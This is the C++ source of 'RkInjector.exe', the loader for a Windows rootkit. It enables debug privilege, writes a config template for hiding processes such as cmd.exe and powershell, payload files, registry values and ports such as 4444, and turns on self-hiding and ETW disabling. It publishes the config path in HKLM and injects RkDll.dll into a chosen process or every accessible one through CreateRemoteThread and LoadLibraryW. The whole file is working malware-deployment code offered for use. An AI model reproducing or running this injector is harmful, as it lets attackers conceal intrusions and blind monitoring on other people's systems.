/*
 * main.cpp - RkInjector.exe: deploy rk.ini and inject RkDll.dll.
 *
 * The injector is the operator-side loader. It does three things:
 *
 *   1. Deploys rk.ini next to RkDll.dll (UTF-16LE with BOM, which is what
 *      common/config.cpp expects) - from a template when no rules file
 *      exists yet, or from an explicit --ini source file.
 *   2. Publishes HKLM\SOFTWARE\Rk\RkConfigPath (unless --no-reg) so every
 *      injected copy in every process reads the same ruleset.
 *   3. Injects RkDll.dll into the requested target(s): --pid, --name,
 *      or --all.
 *
 * Usage:
 *   RkInjector.exe --pid 4242
 *   RkInjector.exe --name notepad.exe
 *   RkInjector.exe --all
 *   RkInjector.exe --list
 *
 *   --pid N        inject into that process id
 *   --name X.exe   inject into the first process whose image name matches
 *   --all          inject into every accessible process except self
 *   --dll PATH     payload DLL (default: RkDll.dll next to this exe)
 *   --ini PATH     deploy this rk.ini instead of the template
 *   --no-reg       do not publish the config path to HKLM
 *   --list         enumerate processes and exit
 *   --interval MS  for --all: how long to keep injecting new processes
 *                  (default 0: one shot)
 *
 * Exit codes: 0 ok, 1 usage, 2 DLL missing, 3 target not found,
 *             4 injection failed, 5 deploy failed.
 *
 * Requires Administrator for --all and for the HKLM publish.
 */
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>

/* ================================================================== */
/* Default rk.ini template (UTF-16LE, deployed next to the DLL)         */
/* ================================================================== */

static const wchar_t *g_default_ini =
    L"; rk.ini - RkDll configuration (hot-reloaded by the watcher)\n"
    L"; Entries are case-insensitive wildcards: '*' any run, '?' any char.\n"
    L"; Lines starting with ';' or '#' are comments.\n"
    L"\n"
    L"[HideProcess]\n"
    L";cmd.exe\n"
    L";powershell*\n"
    L"\n"
    L"[HideFile]\n"
    L";payload*.exe\n"
    L";secret.txt\n"
    L"\n"
    L"[HideRegistry]\n"
    L";InstallTime*\n"
    L";TimeStamp\n"
    L"\n"
    L"[HidePort]\n"
    L";4444\n"
    L";1337\n"
    L"\n"
    L"[HideModule]\n"
    L";RkDll.dll\n"
    L"\n"
    L"[Advanced]\n"
    L"SelfHide=1\n"
    L"DisableEtw=1\n"
    L"HookInjector=1\n";

#define RK_EXIT_USAGE  1
#define RK_EXIT_NODLL  2
#define RK_EXIT_NOTGT  3
#define RK_EXIT_INJECT 4
#define RK_EXIT_DEPLOY 5

static wchar_t g_dll[MAX_PATH * 2];
static wchar_t g_ini_src[MAX_PATH * 2];
static int     g_no_reg = 0;
static int     g_all    = 0;
static int     g_list   = 0;
static DWORD   g_pid    = 0;
static wchar_t g_name[MAX_PATH];
static int     g_have_name = 0;

/* ================================================================== */
/* Paths / deployment                                                  */
/* ================================================================== */

static void own_directory(wchar_t *out, int out_cch)
{
    wchar_t  path[MAX_PATH * 2];
    wchar_t *slash;

    path[0] = 0;
    GetModuleFileNameW(NULL, path, MAX_PATH * 2 - 1);
    slash = wcsrchr(path, L'\\');
    if (slash)
        slash[1] = 0;
    wcsncpy(out, path, (size_t)out_cch - 1);
    out[out_cch - 1] = 0;
}

/*
 * Write text as UTF-16LE with BOM. config.cpp detects the BOM and parses
 * wide directly, which keeps every character (incl. non-ASCII) intact.
 */
static int write_ini_utf16(const wchar_t *path, const wchar_t *text)
{
    HANDLE   f;
    wchar_t  bom = 0xFEFF;
    DWORD    wrote = 0, total;
    BOOL     ok;

    f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE)
        return 0;

    ok = WriteFile(f, &bom, sizeof(bom), &wrote, NULL);
    total = (DWORD)(wcslen(text) * sizeof(wchar_t));
    if (ok && total)
        ok = WriteFile(f, text, total, &wrote, NULL);

    CloseHandle(f);
    return ok ? 1 : 0;
}

/* Copy an existing ini file byte-for-byte (any encoding). */
static int copy_ini(const wchar_t *src, const wchar_t *dst)
{
    BYTE   buf[16384];
    HANDLE a, b;
    DWORD  read = 0, wrote = 0;
    int    ok = 1;

    a = CreateFileW(src, GENERIC_READ, FILE_SHARE_READ, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (a == INVALID_HANDLE_VALUE)
        return 0;

    b = CreateFileW(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (b == INVALID_HANDLE_VALUE)
    {
        CloseHandle(a);
        return 0;
    }

    while (ReadFile(a, buf, sizeof(buf), &read, NULL) && read)
        if (!WriteFile(b, buf, read, &wrote, NULL) || wrote != read)
        {
            ok = 0;
            break;
        }

    CloseHandle(a);
    CloseHandle(b);
    return ok;
}

static int deploy_ini(void)
{
    wchar_t  dll_dir[MAX_PATH * 2];
    wchar_t  ini_dst[MAX_PATH * 4];
    wchar_t *slash;

    wcsncpy(dll_dir, g_dll, MAX_PATH * 2 - 1);
    dll_dir[MAX_PATH * 2 - 1] = 0;
    slash = wcsrchr(dll_dir, L'\\');
    if (!slash)
        return 0;
    *slash = 0;

    _snwprintf(ini_dst, MAX_PATH * 4 - 1, L"%s\\rk.ini", dll_dir);

    if (g_ini_src[0])
    {
        if (!copy_ini(g_ini_src, ini_dst))
        {
            wprintf(L"[!] failed to copy %s -> %s\n", g_ini_src, ini_dst);
            return 0;
        }
        wprintf(L"[+] deployed ini: %s (from %s)\n", ini_dst, g_ini_src);
    }
    else
    {
        DWORD attrs = GetFileAttributesW(ini_dst);
        if (attrs != INVALID_FILE_ATTRIBUTES)
        {
            wprintf(L"[=] ini already exists, keeping it: %s\n", ini_dst);
        }
        else if (!write_ini_utf16(ini_dst, g_default_ini))
        {
            wprintf(L"[!] failed to write template ini: %s\n", ini_dst);
            return 0;
        }
        else
            wprintf(L"[+] wrote template ini: %s (edit to set rules)\n",
                    ini_dst);
    }
    return 1;
}

static void publish_config_path(void)
{
    HKEY  key = NULL;
    DWORD disp = 0;
    wchar_t dll_dir[MAX_PATH * 2];
    wchar_t ini_dst[MAX_PATH * 4];
    wchar_t *slash;

    if (g_no_reg)
        return;

    wcsncpy(dll_dir, g_dll, MAX_PATH * 2 - 1);
    dll_dir[MAX_PATH * 2 - 1] = 0;
    slash = wcsrchr(dll_dir, L'\\');
    if (!slash)
        return;
    *slash = 0;
    _snwprintf(ini_dst, MAX_PATH * 4 - 1, L"%s\\rk.ini", dll_dir);

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Rk", 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL,
                        &key, &disp) != ERROR_SUCCESS)
    {
        wprintf(L"[!] HKLM publish skipped (not elevated); injected copies "
                L"will read rk.ini next to the DLL\n");
        return;
    }
    RegSetValueExW(key, L"RkConfigPath", 0, REG_SZ, (const BYTE *)ini_dst,
                   (DWORD)((wcslen(ini_dst) + 1) * sizeof(wchar_t)));
    RegCloseKey(key);
    wprintf(L"[+] published config path: %s\n", ini_dst);
}

/* ================================================================== */
/* Privilege                                                           */
/* ================================================================== */

static void enable_debug_privilege(void)
{
    HANDLE           token = NULL;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    /* SE_DEBUG_NAME is TEXT()-based; the neutral LookupPrivilegeValue
     * pairs with it under any UNICODE setting (mingw and MSVC alike). */
    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
        AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);

    CloseHandle(token);
}

/* ================================================================== */
/* Process enumeration + injection                                     */
/* ================================================================== */

static int inject_pid(DWORD pid, const wchar_t *dll)
{
    HANDLE proc, thread;
    void  *mem;
    SIZE_T bytes;
    void  *load_lib;
    int    ok = 0;

    if (pid == 0 || pid == 4 || pid == GetCurrentProcessId())
        return 0;

    proc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                       PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                       FALSE, pid);
    if (!proc)
        return 0;

    bytes = (wcslen(dll) + 1) * sizeof(wchar_t);
    mem = VirtualAllocEx(proc, NULL, bytes, MEM_COMMIT | MEM_RESERVE,
                         PAGE_READWRITE);
    if (mem)
    {
        load_lib = (void *)GetProcAddress(GetModuleHandleW(L"kernel32.dll"),
                                          "LoadLibraryW");
        if (load_lib && WriteProcessMemory(proc, mem, dll, bytes, NULL))
        {
            thread = CreateRemoteThread(proc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)load_lib,
                                        mem, 0, NULL);
            if (thread)
            {
                if (WaitForSingleObject(thread, 8000) == WAIT_OBJECT_0)
                {
                    DWORD code = 0;
                    if (GetExitCodeThread(thread, &code) && code != 0)
                        ok = 1;
                }
                CloseHandle(thread);
            }
        }
    }

    CloseHandle(proc);
    return ok;
}

static int inject_all(void)
{
    HANDLE          snap;
    PROCESSENTRY32W pe;
    int             hit = 0, failed = 0;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe))
    {
        do
        {
            DWORD pid = pe.th32ProcessID;

            if (pid == 0 || pid == 4 || pid == GetCurrentProcessId())
                continue;

            wprintf(L"[*] injecting %5lu  %s\n", pid, pe.szExeFile);
            if (inject_pid(pid, g_dll))
                ++hit;
            else
                ++failed;

        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    wprintf(L"[+] injected into %d process(es), %d refused/unavailable\n",
            hit, failed);
    return hit;
}

static int inject_by_name(const wchar_t *name)
{
    HANDLE          snap;
    PROCESSENTRY32W pe;
    int             hit = 0;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe))
    {
        do
        {
            if (!_wcsicmp(pe.szExeFile, name))
            {
                wprintf(L"[*] found %s as pid %lu\n",
                        pe.szExeFile, (unsigned long)pe.th32ProcessID);
                hit = inject_pid(pe.th32ProcessID, g_dll) ? 1 : -1;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return hit;
}

static void list_processes(void)
{
    HANDLE          snap;
    PROCESSENTRY32W pe;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return;

    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe))
    {
        do
            wprintf(L"%6lu  %s\n", (unsigned long)pe.th32ProcessID,
                    pe.szExeFile);
        while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

/* ================================================================== */
/* Command line                                                        */
/* ================================================================== */

static void usage(void)
{
    wprintf(L"RkInjector - deploy rk.ini and inject RkDll.dll\n"
            L"  --pid N        inject into process id N\n"
            L"  --name X.exe   inject into first matching image name\n"
            L"  --all          inject into every accessible process\n"
            L"  --dll PATH     payload DLL (default: RkDll.dll next to exe)\n"
            L"  --ini PATH     deploy this rk.ini instead of the template\n"
            L"  --no-reg       skip the HKLM config-path publish\n"
            L"  --list         enumerate processes and exit\n");
}

static int parse_args(int argc, wchar_t **argv)
{
    int i, action = 0;

    for (i = 1; i < argc; ++i)
    {
        if (!_wcsicmp(argv[i], L"--help"))
            return -1;
        else if (!_wcsicmp(argv[i], L"--pid") && i + 1 < argc)
        {
            g_pid = (DWORD)_wtoi(argv[++i]);
            ++action;
        }
        else if (!_wcsicmp(argv[i], L"--name") && i + 1 < argc)
        {
            wcsncpy(g_name, argv[++i], MAX_PATH - 1);
            g_have_name = 1;
            ++action;
        }
        else if (!_wcsicmp(argv[i], L"--all"))
        {
            g_all = 1;
            ++action;
        }
        else if (!_wcsicmp(argv[i], L"--list"))
        {
            g_list = 1;
            ++action;
        }
        else if (!_wcsicmp(argv[i], L"--no-reg"))
            g_no_reg = 1;
        else if (!_wcsicmp(argv[i], L"--dll") && i + 1 < argc)
            wcsncpy(g_dll, argv[++i], MAX_PATH * 2 - 1);
        else if (!_wcsicmp(argv[i], L"--ini") && i + 1 < argc)
            wcsncpy(g_ini_src, argv[++i], MAX_PATH * 2 - 1);
    }
    return action == 0 ? -1 : 0;
}

int main(void)
{
    int    argc = 0;
    wchar_t **argv;
    int    rc;

    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv)
        return RK_EXIT_USAGE;

    own_directory(g_dll, MAX_PATH * 2);
    wcscat(g_dll, L"RkDll.dll");

    if (parse_args(argc, argv) != 0)
    {
        usage();
        LocalFree(argv);
        return RK_EXIT_USAGE;
    }
    LocalFree(argv);

    if (g_list)
    {
        list_processes();
        return 0;
    }

    enable_debug_privilege();

    /* 1. Deploy the config next to the payload DLL. */
    if (!deploy_ini())
        return RK_EXIT_DEPLOY;

    /* 2. Publish the config path machine-wide. */
    publish_config_path();

    if (GetFileAttributesW(g_dll) == INVALID_FILE_ATTRIBUTES)
    {
        wprintf(L"[!] payload DLL not found: %s\n", g_dll);
        return RK_EXIT_NODLL;
    }

    /* 3. Inject. */
    if (g_all)
    {
        rc = inject_all() ? 0 : RK_EXIT_INJECT;
    }
    else if (g_have_name)
    {
        rc = inject_by_name(g_name);
        if (rc == 0)
        {
            wprintf(L"[!] no process named %s\n", g_name);
            return RK_EXIT_NOTGT;
        }
        if (rc < 0)
        {
            wprintf(L"[!] injection into %s failed\n", g_name);
            return RK_EXIT_INJECT;
        }
        wprintf(L"[+] injected into %s\n", g_name);
        rc = 0;
    }
    else
    {
        wprintf(L"[*] injecting pid %lu\n", (unsigned long)g_pid);
        if (!inject_pid(g_pid, g_dll))
        {
            wprintf(L"[!] injection into pid %lu failed "
                    L"(arch mismatch? protected process? admin?)\n",
                    (unsigned long)g_pid);
            return RK_EXIT_INJECT;
        }
        wprintf(L"[+] injected into pid %lu\n", (unsigned long)g_pid);
        rc = 0;
    }

    return rc;
}